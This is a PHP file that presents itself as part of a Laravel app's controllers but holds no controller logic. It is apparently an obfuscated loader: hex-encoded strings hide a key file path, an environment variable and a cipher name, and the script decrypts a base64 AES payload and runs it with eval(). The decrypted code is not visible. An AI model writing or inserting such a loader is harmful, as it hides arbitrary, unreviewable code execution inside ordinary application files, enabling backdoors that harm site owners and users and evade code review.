<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('C3Z2e+81w1Rd8T3Wd/9KRw==');

$c=base64_decode(

'znFi6B7Is638aIFcFjmcnHF//sVHJmB0C1OM2T/YzSZMIDRJY0p5jJpGw4gzlmxN1ycvXFxU2nJA' .
'c0osn2WmONjY5VeepBNOrSnLAB7EawF31FhgKsCWDG2WCIh9t3gwTZFod02CnY82uSnzocPhroSf' .
'zcqSOuAxZw3rrN+jFlebc068YRov8DiJMZahAanVabMN0ErYYIU91d+wpDo5nLb60U6Vnnsehsq8' .
'hbMWcWSe7XnTk3UT6/GAhUtUdsFIZJijVGJwaQXtwHJGZH+So34dhdfJZ2nznzT7rKsfTyTIhflF' .
'GJeueJpaCDzHppNEW6t7WYs9CylcihGwRbDxIBfmI5mUrJazwDMM1O2h2m3jf5tXvTCJTF25Vux/' .
'0q+jrpf1107foMmBfFjI0p+RTA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

